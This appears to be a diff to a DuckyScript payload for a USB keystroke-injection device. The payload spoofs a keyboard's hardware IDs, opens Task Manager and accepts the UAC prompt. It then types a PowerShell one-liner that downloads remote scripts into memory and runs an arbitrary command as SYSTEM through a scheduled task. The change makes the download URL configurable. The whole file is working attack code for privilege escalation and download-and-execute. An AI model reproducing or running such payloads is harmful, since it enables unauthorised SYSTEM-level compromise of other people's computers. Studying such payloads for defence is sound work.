@@ -7,14 +7,11 @@ NOTES:
 	- Assumes UAC is set to always notify. but will work either way.
 OPSEC:
 	- Will create a scheduled task to elevate.
-	- Will download mkellerman's Invoke-CommandAs repo from github.
+	- Will download powershell into memory.
 END_REM
 
 REM --> Change VID,PID if you want.
 ATTACKMODE HID VID_0000 PID_0000 MAN_name PROD_name SERIAL_000000000000
-
-REM --> Variable is the thing you want to run as system. (whoami for test)
-DEFINE COMMAND_AS_SYSTEM whoami
 
 REM --> Speed up injection using Korben DETECT_READY Extension.
 EXTENSION DETECT_READY
@@ -45,6 +42,12 @@ EXTENSION DETECT_READY
     CAPSLOCK
 END_EXTENSION
 
+REM --> The thing you want to run as system. (whoami for test)
+DEFINE COMMAND_AS_SYSTEM whoami
+
+REM --> Replace this with the #Example command from readme.
+DEFINE COMMAND_AS_URL example.com 
+
 REM --> Open taskmanager and accept UAC prompt.
 GUI x
 DELAY 500
@@ -64,7 +67,7 @@ TAB
 SPACE
 ENTER
 DELAY 500
-STRING taskkill /IM taskmgr.exe ; "Public/Invoke-CommandAs.ps1", "Private/Invoke-ScheduledTask.ps1" | % { . ([ScriptBlock]::Create((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mkellerman\/Invoke-CommandAs/master/Invoke-CommandAs/${_}")))} ; Invoke-CommandAs -ScriptBlock { COMMAND_AS_SYSTEM } -AsSystem
+STRING taskkill /IM taskmgr.exe ; "Public/Invoke-CommandAs.ps1", "Private/Invoke-ScheduledTask.ps1" | % { . ([ScriptBlock]::Create((New-Object Net.WebClient).DownloadString("COMMAND_AS_URL${_}")))} ; Invoke-CommandAs -ScriptBlock { COMMAND_AS_SYSTEM } -AsSystem
 ENTER
 
 REM --> Signal that command ran successfully.
